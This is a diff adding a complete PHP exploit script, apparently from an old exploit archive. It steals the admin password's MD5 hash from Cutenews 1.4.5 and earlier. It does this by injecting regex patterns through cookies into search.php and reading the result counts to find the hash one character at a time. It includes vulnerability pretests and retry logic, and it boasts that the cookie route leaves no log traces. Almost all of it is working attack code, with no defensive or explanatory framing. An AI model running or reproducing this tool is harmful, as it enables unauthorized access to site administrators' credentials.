@@ -1,0 +1,287 @@
+<?php
+error_reporting(E_ALL); 
+/////////////////////////////////////////////////////////////////////// 
+///////////////////////////////////////////////////////////////////////
+// Cutenews <= 1.4.5 admin password md5 hash fetching exploit
+// Version 1.0
+// written by Janek Vind "waraxe" 
+// http://www.waraxe.us
+// 23. dec 2007
+// Estonia, Tartu
+//
+// FEATURES:
+// 1. Fetching algorithm optimized for speed
+// 2. Attack goes through $_COOKIE, so no log fear
+// 3. Pretesting saves time if Cutenews is not vulnerable
+//
+// More useful tools: http://www.waraxe.us/tools/
+// Waraxe forums: http://www.waraxe.us/forums.html 
+//
+// NB! This exploit is meant to be run as php CLI!
+// http://www.php.net/features.commandline
+/////////////////////////////////////////////////////////////////////// 
+/////////////////////////////////////////////////////////////////////// 
+//===================================================================== 
+$target = 'http://localhost/cutenews.1.4.5/search.php';
+$username = 'waraxe'; // Username is needed
+$outfile = './cute_log.txt';// Log file
+//=====================================================================
+///////////////////////////////////////////////////////////////////////
+// Don't mess below this line, unless you know the stuff ;)
+///////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////
+///////////////////////////////////////////////////////////////////////
+$levels = array(1=>'admin',2=>'editor',3=>'journalist',4=>'commenter');
+$start_time = time();
+$requests = 0;
+$cli = php_sapi_name() === 'cli';
+//=====================================================================
+// Warning, if executed from webserver
+//=====================================================================
+if(!$cli)
+{
+	if(!isset($_REQUEST['wtf-is-cli']))
+	{ 
+		echo "<html><head><title>Attention!</title></head>\n";
+		echo "<body><br /><br /><center>\n";
+		echo "<h1>Warning!</h1>\n";
+		echo "This exploit is meant to be used as php CLI script!<br />\n";
+		echo "More information:<br />\n";
+		echo "<a href=\"http://www.google.com/search?hl=en&q=php+cli+windows\" target=\"_blank\">http://www.google.com/search?hl=en&q=php+cli+windows</a><br />\n";
+		echo "Still, you can try to run it from webserver.<br />\n";
+		echo "Just press the button below and prepare for long waiting<br />\n";
+		echo "And learn to use php CLI next time, please ...<br />\n";
+		echo "<form method=\"get\">\n";
+		echo "<input type=\"submit\" name=\"wtf-is-cli\" value=\"Let me in, i don't care\">\n";
+		echo "</form>\n";
+		echo "</center></body></html>\n";
+		exit;
+	}
+	else
+	{
+		// Let's try to maximize our chances without CLI
+		set_time_limit(0);
+	}
+}
+//=====================================================================
+add_logline("-------------------------------------------------------");
+add_logline("Cutenews password md5 hash fetching started");
+add_logline("Target: $target");
+add_logline("Username: $username");
+
+pre_test();
+
+$h = get_hash();
+$run_time = time() - $start_time;
+
+add_logline("MD5 hash: $h");
+
+xecho("\nFinal MD5 hash: $h", 1);
+xecho("\nTotal time spent: $run_time seconds", 1);
+xecho("HTTP requests made: $requests\n", 1);
+xecho("Questions and feedback - http://www.waraxe.us/forums.html", 1); 
+xecho("See ya! :)", 1);
+
+exit; 
+//////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////////////////////////
+function get_hash()
+{
+	$hash = '';
+	
+	for($i = 0; $i < 32; $i ++)
+	{
+		xecho("Finding hash char pos $i");
+		$c = get_hash_char($i);
+		$hash .= $c;
+		xecho("Current hash: $hash");
+	}
+	
+	return $hash;
+}
+///////////////////////////////////////////////////////////////////////
+function get_hash_char($pos)
+{
+	global $username;
+	
+	$un = "^$username\$";
+	$charset = '0123456789abcdef';
+	
+	$beg = '^';
+	if($pos > 0)
+	{
+		$beg .= "([a-f0-9]{{$pos}})";
+	}
+	
+	$end = '$';
+	if($pos < 31)
+	{
+		$cnt = 31 - $pos;
+		$end = "([a-f0-9]{{$cnt}})\$"; 
+	}
+	
+	for($i = 8; $i > 0; $i >>= 1)
+	{
+		$first = substr($charset, 0, $i);
+		$second = substr($charset, $i);		
+		$hp = "$beg([$first])$end";
+
+		if( make_query($un, $hp) === 1)
+		{
+			xecho("Position $pos: [$first]");
+			$charset = $first;
+		}
+		else
+		{
+			xecho("Position $pos: [$second]");
+			$charset = $second;
+		}
+	}
+	
+	return $charset;
+}
+///////////////////////////////////////////////////////////////////////
+function pre_test()
+{
+	global $username;
+	
+	// Target URL valid?
+	xecho("Validating target URL");
+	if(strpos(make_get($GLOBALS['target']), 'search_in_archives') === false)
+	{
+		die('Target URL not valid!');
+	}
+	xecho("URL is valid");
+	
+	$un = "^$username\$";
+	if( make_query($un) !== 1)
+	{
+		die('Pretest 1 failed - wrong username?');
+	}
+	else
+	{
+		xecho("Pretest 1 passed - username OK", 1);
+	}
+
+	$hp = '^[a-f0-9]{32}$';
+	if( make_query($un, $hp) !== 1)
+	{
+		die('Pretest 2 failed - target not vulnerable?');
+	}
+	else
+	{
+		xecho("Pretest 2 passed - regex injection OK", 1);
+	}
+
+	$hp = '^[a-f0-9]{1337}$';
+	if( make_query($un, $hp) !== 0)
+	{
+		die('Pretest 3 failed - target not vulnerable?');
+	}
+	else
+	{
+		xecho("Pretest 3 passed - regex injection OK", 1);
+	}
+}
+///////////////////////////////////////////////////////////////////////
+function make_query($username, $hashpattern = '')
+{
+	global $target;
+	$max_retries = 10;
+	
+	$cookie = "dosearch=yes;files_arch[]=./data/users.db.php;title=$username";
+	if(!empty($hashpattern))
+	{
+		$cookie .= ";story=$hashpattern";
+	}
+	
+	for($retry = 0; $retry < $max_retries + 1; $retry ++)
+	{
+		if($retry > 0)
+		{
+			xecho("Request failed!", 1);
+			xecho("Sleeping $retry seconds", 1);
+			sleep($retry);
+			xecho("Awake ...", 1);
+			xecho("Retry #$retry", 1);
+		}
+		$buff = make_get($target, $cookie);
+		$x = strpos($buff, '<b>Founded News articles [');
+		$y = strpos($buff, ']:</b>', $x + 25);
+		if( ($x !== false) && ($y !== false) && ($x < $y) )
+		{
+			$buff = trim(substr($buff, $x + 26, $y - $x - 26));
+			$ret = intval($buff);
+			if( ($ret > -1) && ($ret < 2) )
+			{
+				return $ret;
+			}
+		}
+	}
+	
+	die('Fatal errror - server down?');
+}
+///////////////////////////////////////////////////////////////////////
+function make_get($url, $cookie = '', $referer = '', $headers = FALSE)
+{
+	$ch = curl_init();
+	$timeout = 120;
+	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout); 
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)');
+	
+	if(!empty($cookie))
+	{
+		curl_setopt($ch, CURLOPT_COOKIE, $cookie);
+	}
+ 
+	if(!empty($referer))
+	{
+		curl_setopt($ch, CURLOPT_REFERER, $referer);
+	}
+
+	if($headers === TRUE)
+	{
+		curl_setopt($ch, CURLOPT_HEADER, TRUE);
+	}
+	else
+	{
+		curl_setopt($ch, CURLOPT_HEADER, FALSE);
+	}
+
+	$fc = curl_exec($ch);
+	curl_close($ch);
+	$GLOBALS['requests'] ++;
+	
+	return $fc;
+}
+//////////////////////////////////////////////////////////////////////
+function add_logline($line)
+{
+	global $outfile;
+	
+	$line .= "\n";
+	$fh = fopen($outfile, 'ab');
+	fwrite($fh, $line);
+	fclose($fh);
+	
+}
+//////////////////////////////////////////////////////////////////////
+function xecho($line, $both = 0)
+{
+	if($GLOBALS['cli'])
+	{
+		echo "$line\n";
+	}
+	elseif($both)
+	{
+		$line = nl2br(htmlspecialchars($line));
+		echo "$line<br />\n";
+	}
+}
+/////////////////////////////////////////////////////////////////////
+?>
+
+# milw0rm.com [2007-12-24]
